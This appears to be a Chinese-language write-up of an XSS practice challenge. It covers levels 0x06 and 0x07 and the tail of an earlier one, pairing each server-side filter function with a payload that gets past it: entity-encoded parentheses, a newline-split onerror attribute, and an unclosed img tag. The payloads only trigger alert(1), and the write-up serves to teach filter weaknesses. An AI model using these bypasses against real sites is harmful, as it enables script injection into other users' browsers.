Server Code

function render (input) {   const stripBracketsRe = /[()`]/g   input = input.replace(stripBracketsRe, '')   return input }

这一次连 `` 也被过滤了，所以我们使用实体化编码绕过，来换一种方式触发XSS。

<img src=1 onerror=alert&#40;1&#41;> //载入图片，如果图片异常触发onerror事件

Server Code

0x06

Server Code

function render (input) {   input = input.replace(/auto|on.*=|>/ig, '_')   return `<input value=1 ${input} type="text">` }

这一次过滤 on 开头 = 或 > 结尾的内容所以至少得用无 <> 的语句直接写在内部避免过滤，同时又不能有以 = 结尾的内容，所以换行避免匹配

type="image" src=1 onerror ="alert(1)"


0x07

Server Code

function render (input) {   const stripTagsRe = /<\/?[^>]+>/gi   input = input.replace(stripTagsRe, '')   return `<article>${input}</article>`  }

这一次匹配了<>开头结尾的字符串全部替换为空且语句在标签中间，必须得使用<>才能进行XSS所以利用HTML部分标签的容错性 只输入一边的< ，同样可以执行

<img src=1 onerror='alert(1)'
